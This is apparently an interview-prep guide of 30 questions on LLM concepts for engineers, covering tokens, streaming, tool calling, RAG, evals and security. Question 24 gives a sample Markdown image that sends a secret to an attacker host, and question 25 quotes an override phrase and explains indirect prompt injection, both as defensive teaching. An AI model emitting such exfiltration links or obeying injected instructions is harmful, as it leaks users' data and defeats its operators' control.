# AI concepts for engineers: 30 interview questions

Answer each question out loud first, then open the answer. These come up in AI-product frontend loops, applied-AI engineer loops, and the new "AI fluency" parts of normal loops.

> Facts about specific providers and browser APIs change fast. Where an answer depends on a vendor or a version, it says so. Check current docs before quoting numbers in an interview.

---

## A. LLM basics for engineers

### 1. What is a token, and why should a frontend engineer care?

<details><summary>Answer</summary>

A token is the unit the model reads and writes: a piece of a word, a word, or a symbol. For English, one token is very roughly ¾ of a word (about 4 characters). Many other languages, including Persian and Arabic, often use **more tokens per word**, so the same message can cost more and fill the context faster.

Why it matters for frontend:
- **Cost** is priced per input and output token.
- **Limits** (context window, max output) are in tokens, not characters. A character counter in the UI is wrong. Use the model's tokenizer, or a server count endpoint, in a worker.
- **Streaming** arrives as token chunks, which may split a word or even a multi-byte character, so the client must handle partial UTF-8 and partial Markdown.
</details>

### 2. What is the context window, and what happens when a conversation exceeds it?

<details><summary>Answer</summary>

The context window is the maximum number of tokens the model can take in one request: system prompt + history + documents + tool definitions + the output it generates. If the request is too large, the API returns an error. Some products cut the oldest content silently.

Strategies:
- **Sliding window:** keep the system prompt plus the last N turns that fit a token budget.
- **Summarize old turns** into a short memory message.
- **Retrieve** only the relevant old messages (RAG over history).
- Reserve space for the answer: `budget = contextWindow − maxOutputTokens − safety margin`.

Also, more context isn't free even when it fits. It increases cost and latency, and models can pay less attention to information in the middle of very long contexts.
</details>

### 3. Temperature and top-p: what do they do? What would you use for a code formatter vs. a brainstorming tool?

<details><summary>Answer</summary>

The model outputs a probability distribution for the next token.
- **Temperature** reshapes it. Low (near 0) makes the most likely tokens even more likely, so output is focused and repeatable. High makes it flatter, so output is more varied and creative but more likely to go wrong.
- **Top-p (nucleus sampling)** only samples from the smallest set of tokens whose probabilities add up to p.

Usually you change one of them, not both. Code formatting, extraction, and classification: low temperature. Brainstorming, names, marketing copy: higher. Some newer reasoning models fix or ignore these parameters, so check the provider docs.
</details>

### 4. Why do you get different answers for the same prompt, even with temperature 0?

<details><summary>Answer</summary>

- With temperature > 0, sampling is random by design.
- Even at 0, results can differ because of floating-point differences in GPU math, batching with other requests, and different hardware or model replicas. Providers also update models behind the same alias.
- **Seeds**, where offered, make results *more* reproducible, but providers usually describe this as best effort.

Engineering consequences: pin exact model versions, store the full request for debugging, and test with **evals over many examples** instead of exact-match snapshot tests.
</details>

### 5. What is a hallucination, and how do you reduce it in a product?

<details><summary>Answer</summary>

A confident, fluent answer that is false or not supported by the provided sources. Ways to reduce it:
- **Ground** the model: give it the relevant sources (RAG) and instruct it to answer only from them.
- Allow and reward **"I don't know"**, and refuse when retrieval confidence is low.
- Require **citations**, and validate them after generation.
- Use **tools** for facts that change or need precision (prices, order status, math).
- Use **structured outputs** for fields you parse.
- **Evaluate** faithfulness on a test set, and monitor feedback in production.
- UX: show sources, and make it easy to verify or report.
</details>

---

## B. Product and UX

### 6. Why stream responses? What's TTFT and why does it matter more than total time?

<details><summary>Answer</summary>

Generation can take seconds. Streaming shows text as it's produced, so the user starts reading almost immediately.

- **TTFT** (time to first token) mostly depends on queueing and on the prompt size, because the model processes the input first.
- **Tokens per second** decides how fast the rest arrives.

Users judge speed mostly by TTFT and by whether progress is visible. To improve perceived latency: show a "thinking / searching sources…" state right away, render the user message optimistically, stream, and keep the prompt small.
</details>

### 7. How do you render streaming Markdown efficiently?

<details><summary>Answer</summary>

The naive approach re-parses the whole message for every token: O(n²) work, plus re-highlighting code and DOM thrash.

Better:
- Buffer tokens and **flush once per animation frame**.
- Split into blocks. Memoize **completed blocks**, and re-parse only the **last open block**.
- Auto-close unfinished syntax (an open code fence, `**`) while streaming to avoid flicker.
- Highlight code **after its block is complete**, in a worker or on idle.
- Re-render only the streaming message component.
- Sanitize the output (see question 24).
</details>

### 8. How would you communicate uncertainty or quality to users?

<details><summary>Answer</summary>

- **Citations** with previews, so users can verify.
- Explicit "I couldn't find this in the docs" states, instead of guessing.
- Labels for what kind of content it is: "AI-generated", the model used, the date of the sources.
- For risky domains (money, health, legal), add a stronger warning and route to a human or an exact policy quote.
- Avoid fake precision like "92% confident" unless the number is actually calibrated.
- Thumbs up/down, regenerate, and "report a problem" give users control and give you signals.
</details>

### 9. What should "Stop" and "Regenerate" do technically?

<details><summary>Answer</summary>

**Stop:** abort the fetch (`AbortController`) so the UI stops instantly, and tell the server to cancel generation. That saves tokens, because proxies don't always pass the client disconnect through. Keep the partial text marked "stopped".

**Regenerate:** create a **new sibling** assistant message for the same user message. Don't overwrite the old one. Store messages as a tree so users can switch between versions. Regenerate rate is a useful quality signal.
</details>

### 10. How do you design an AI feature so it degrades gracefully?

<details><summary>Answer</summary>

- The core product works without the AI feature (the feature is an enhancement).
- Timeouts with fallbacks: a smaller model, a cached answer, or non-AI search results.
- Clear error states with Retry, and keeping the user's input.
- Rate-limit messages with the wait time.
- Feature flags to turn the feature off quickly during provider incidents.
</details>

---

## C. API and engineering

### 11. SSE vs WebSocket vs fetch streaming for LLM output: which and why?

<details><summary>Answer</summary>

| | fetch + `ReadableStream` | `EventSource` (SSE) | WebSocket |
|---|---|---|---|
| Direction | Response streaming | Server → client | Both ways |
| Method/body | Any (POST with JSON) | GET only | Messages |
| Headers/auth | Normal headers | Cookies only, no custom headers | Only during the handshake |
| Reconnect | Build it yourself | Built in, `Last-Event-ID` | Build it yourself |
| Infra | Normal HTTP | Normal HTTP | Stateful, harder load balancing |

Most LLM APIs stream responses in **SSE format over a POST**, which browsers read with `fetch` + `ReadableStream` + a small SSE parser. Use `EventSource` for resumable GET streams. Use WebSocket when you really need two-way, low-latency messaging (voice, collaboration, many events from both sides).
</details>

### 12. What are structured outputs, and why are they better than "please reply in JSON"?

<details><summary>Answer</summary>

Many providers can **constrain** the output to a JSON schema (structured outputs, JSON mode, or tool calling with a schema). The decoder only produces valid tokens for the schema, so you don't get broken JSON or missing fields. Exact guarantees differ by provider and by schema features.

Still validate on your side (zod or ajv), because the *values* can still be wrong. And handle refusals or cut-off output (`finish_reason: length`).
</details>

### 13. Explain tool / function calling. Who executes the function?

<details><summary>Answer</summary>

You send tool definitions (name, description, JSON schema for arguments). The model can reply with a **tool call**: a tool name plus arguments. **Your code executes it**, never the model. You send the result back as a tool message, and the model continues. Loop until the model gives a final answer.

Engineering points:
- Validate the arguments against the schema.
- Use timeouts per tool and run independent tool calls in parallel.
- Cap the number of iterations, and set a cost budget.
- Make side effects idempotent, and require human approval for risky actions.
- Treat tool results as **untrusted** (prompt injection).
</details>

### 14. How do you handle 429s and retries for model APIs?

<details><summary>Answer</summary>

- Respect `Retry-After` (or provider-specific headers that say when the limit resets).
- Use exponential backoff with **jitter**, a maximum number of retries, and a total deadline.
- Retry only retryable errors: 429, 5xx, and network errors. Don't retry 400 or 401.
- Use **idempotency keys** for operations with side effects, so retries don't double-charge or double-send.
- Queue requests on the server with a concurrency limit per tenant, so one heavy user can't block others.
- In the UI: tell the user, show a countdown, keep their input, and don't loop silently.
</details>

### 15. What is prompt caching, and how do you design prompts to benefit from it?

<details><summary>Answer</summary>

Several providers can cache the processed form of a **prompt prefix**. If the next request starts with exactly the same prefix, the cached part costs less (often much less) and has lower TTFT. Details differ by provider: some cache automatically, some need explicit markers, and there are minimum lengths and time-to-live windows.

Design rules:
- Put **stable content first** (system prompt, tool definitions, long documents), and **changing content last** (the newest user message).
- Don't put timestamps, random ids, or per-request data at the top.
- Keep the order of tools and documents stable.
- Measure the cache hit rate using the usage fields the API returns.
</details>

### 16. What is model routing?

<details><summary>Answer</summary>

Send each request to the cheapest model that can do it well:
- A small model for classification, query rewriting, titles, and simple answers.
- A large model for complex reasoning, long documents, or when the small model is unsure.

The router can be rules (task type, input length), a classifier, or cascading: try the small model, check quality with a validator, and escalate if it fails. Evaluate the router itself. A bad router saves money but quietly lowers quality.
</details>

### 17. What is semantic caching, and when is it dangerous?

<details><summary>Answer</summary>

Cache answers by **meaning** instead of exact text: embed the question, and if a very similar question was answered before, return the cached answer.

It works well for FAQ-style traffic (support bots). It's dangerous when:
- The answer depends on the user (their account, their permissions). Include the user or tenant and the permission scope in the cache key, or don't cache.
- The data changes. Key on source document versions, and set a TTL.
- "Similar" isn't the same: "how to *enable* X" vs "how to *disable* X" can embed close together. Use a strict similarity threshold and evaluate it.
</details>

### 18. Cost math: estimate the monthly model cost for a feature.

<details><summary>Answer</summary>

Example (made-up prices, use real ones in practice): 100k requests/day, an average of 2,000 input tokens and 300 output tokens. Price: $1 per 1M input tokens, $5 per 1M output tokens.

```
input  = 100,000 × 2,000 = 200M tokens/day × $1/1M  = $200/day
output = 100,000 ×   300 =  30M tokens/day × $5/1M  = $150/day
total ≈ $350/day ≈ $10.5k/month
```

Levers: shorter prompts (fewer documents, summarized history), prompt caching on the stable prefix, routing to smaller models, a lower `max_tokens`, semantic caching, and not calling the model at all when a deterministic path works. Notice that **input** is often the bigger part, so trimming context is usually the first win.
</details>

### 19. How would you test code that calls an LLM?

<details><summary>Answer</summary>

- **Unit tests:** mock the model client. Test parsing, streaming (chunks split in odd places), retries, timeouts, and tool execution logic.
- **Contract tests:** validate outputs against the schema.
- **Evals:** a dataset of inputs with expected properties, scored by exact checks, regexes, schema validation, and an LLM judge where needed. Run them in CI for prompt and model changes, and compare with a baseline.
- **Record and replay** real responses for deterministic integration tests.
- **Production monitoring:** feedback, error rates, sampled human review.
</details>

---

## D. RAG and evals

### 20. Walk through a RAG pipeline. Where does it usually fail?

<details><summary>Answer</summary>

Ingest → parse → chunk → embed → index. Then at query time: rewrite the query → retrieve (vector + keyword) → rerank → build the prompt with sources → generate with citations → validate.

Common failures:
- **Bad parsing:** PDF tables broken, navigation text indexed.
- **Bad chunking:** the answer is split across chunks, or a chunk has lost its heading.
- **Vocabulary mismatch:** error codes and product names are missed by pure vector search. Add BM25.
- **Too many or irrelevant chunks** confuse the model.
- **Stale index:** deleted docs are still retrieved.
- **Permission leaks:** no ACL filter.

Always measure retrieval (recall@k) separately from generation (faithfulness). That tells you which half to fix.
</details>

### 21. How do you choose chunk size?

<details><summary>Answer</summary>

There's no universal number. Small chunks are precise but lose context. Big chunks keep context but add noise and cost. Start with **structure-aware** chunks (by headings and paragraphs, a few hundred tokens), add a small overlap, and prepend the document title and heading path. Then tune with your eval set (recall@k and answer quality), not by guessing. Never split tables or code blocks.
</details>

### 22. What's hybrid search, and why add a reranker?

<details><summary>Answer</summary>

**Hybrid** = vector (semantic) search + keyword (BM25) search, merged (for example with reciprocal rank fusion). Vector search finds paraphrases, and keyword search finds exact terms like IDs, codes, and names.

A **reranker** (a cross-encoder) reads the query and each candidate *together* and scores relevance much more accurately than embedding similarity. Retrieve about 20–50 candidates cheaply, rerank, and keep the top 5–8. It usually improves quality a lot for a small latency cost.
</details>

### 23. What are the pitfalls of LLM-as-judge, and how do you trust it?

<details><summary>Answer</summary>

Known biases:
- **Verbosity bias:** prefers longer answers.
- **Position bias:** in pairwise comparisons, prefers the first (or second) option.
- **Self-preference:** may prefer outputs from its own model family.
- Inconsistency between runs, and vague rubrics.

Make it trustworthy:
- Use a clear rubric with specific criteria (for example "every claim is supported by a source": yes/no).
- Have humans label a sample, and measure agreement with the judge. Iterate on the rubric until agreement is acceptable.
- Swap positions in pairwise tests.
- Use deterministic checks wherever possible (schema validity, citation exists, exact match).
- Re-check calibration when you change the judge model.
</details>

---

## E. Security and safety

### 24. A model's answer is Markdown. How do you render it safely?

<details><summary>Answer</summary>

Treat model output exactly like **user-generated content**, because prompt injection can make the model output anything.
- Render Markdown with **raw HTML disabled**, then sanitize (DOMPurify), or use a renderer that outputs React elements from an AST with an allowlist. Never `dangerouslySetInnerHTML(marked(text))` without sanitizing.
- Links: allow only `http`, `https`, and `mailto` (block `javascript:` and `data:`). Add `rel="noopener noreferrer"`.
- **Images can exfiltrate data:** `![x](https://attacker.com/?q=<secret>)` sends data when the image loads. Block external images or proxy them.
- A strict **CSP** as defense in depth.
- Code blocks: show them as text. Never execute them automatically.
</details>

### 25. What is prompt injection? What's indirect prompt injection?

<details><summary>Answer</summary>

**Prompt injection:** input that makes the model ignore its instructions ("ignore previous instructions and…").

**Indirect injection:** the malicious instructions are inside **content the model reads**: a web page, an email, a PDF, a GitHub issue, a retrieved doc, a tool result. The user may not even see it. This is the dangerous one for agents and RAG.

There's no complete fix today. Reduce the damage:
- **Least privilege:** the model only has the tools and data it needs.
- **Human approval** for actions with side effects or that send data out.
- Separate trusted instructions from untrusted data (clear delimiters, data roles), knowing this helps but isn't a guarantee.
- Egress allowlists, and block exfiltration paths like image URLs and links.
- Output validation, plus monitoring for unusual tool use.
- Never put secrets in prompts that untrusted content can reach.
</details>

### 26. Why must API keys never be in the browser, and what about PII?

<details><summary>Answer</summary>

Anything in the client can be read: bundles, network requests, memory. A model API key in the frontend gets stolen and used for someone else's traffic on your bill. Use a **backend proxy** that adds credentials, authenticates the user, enforces per-user rate limits and quotas, and logs usage.

PII: minimize what you send to the model, redact where possible, and check the provider's data retention and training policies (business agreements often differ from consumer terms). Don't send prompts to client-side analytics tools. Give users deletion controls.
</details>

### 27. How do you prevent abuse of a public AI feature?

<details><summary>Answer</summary>

Rate limits per user, per IP, and per tenant. Require auth for expensive features. Cap request size and `max_tokens`. A classifier that refuses off-topic use (so the support bot doesn't become a free general chatbot). CAPTCHA or proof-of-work on spikes. Budgets and alerts on spend. Moderation for policy-violating content.
</details>

---

## F. On-device and browser AI

### 28. When would you run a model in the browser instead of on a server?

<details><summary>Answer</summary>

**Options (check current status before relying on them):**
- **WebGPU** (supported in recent Chromium-based browsers, and increasingly in others) lets libraries such as Transformers.js, ONNX Runtime Web, or WebLLM run small models on the user's GPU. **WebAssembly** is the CPU fallback.
- **Chrome's built-in AI APIs** (for example Summarizer, Translator, Language Detector, and a Prompt API) use a model Chrome downloads and runs on the device. Some have shipped in stable Chrome, while others were in origin trials or limited to extensions at the time of writing. Availability depends on browser, version, hardware, and flags, so always feature-detect.

**Good for:** privacy (data never leaves the device), offline use, zero per-request server cost, and small tasks with low latency (classification, embeddings for local search, translation, summarizing short text, background removal).

**Downsides:** large downloads (tens of MB to GBs), uneven hardware, battery use, weaker models than server ones, and more work on the main thread (use workers).

A good answer is often **hybrid**: run on-device when it's available and good enough, and fall back to the server.
</details>

---

## G. Agentic coding tools and engineering workflow

### 29. How do you review an AI-generated pull request?

<details><summary>Answer</summary>

The same bar as human code, with extra attention to typical AI failure patterns:
- **Plausible but wrong:** invented APIs or options, wrong library versions, subtle off-by-one or race bugs, swallowed errors.
- **Tests that test nothing:** mocks that make the test pass whatever happens, or tests updated to match buggy behavior.
- **Scope creep:** unrelated refactors, reformatting, deleted code "for cleanup".
- **Security:** injection, secrets, over-broad permissions, new dependencies (check that they exist and are trusted, because "slopsquatting" packages are a real risk).
- **Duplication:** it reimplemented something that already exists in the codebase.

Process: read the spec or ticket first, then the tests, then the code. Run it. Keep PRs small. Require CI with types, lint, tests, and security scanning. The human who merges owns the code.
</details>

### 30. How would you measure whether AI tools actually make a team faster?

<details><summary>Answer</summary>

Don't trust feelings alone. Developers' self-reports and measured results can disagree, and published studies have found mixed results depending on the task and the developer's experience.

Measure outcomes, with a baseline period or a comparison group:
- **Flow:** cycle time (ticket start → merged → deployed), PR size, and time in review.
- **Quality:** change failure rate, reverted PRs, bugs per change, incidents.
- **Review load:** reviewer hours per PR. AI can move work from writing to reviewing.
- **Adoption:** acceptance rate of suggestions, share of PRs created with agents, and the merge rate of agent PRs.
- **Developer experience:** surveys, used alongside the hard numbers.

Look at results per type of task. AI often helps a lot with boilerplate, tests, and migrations, and less with novel design work.
</details>
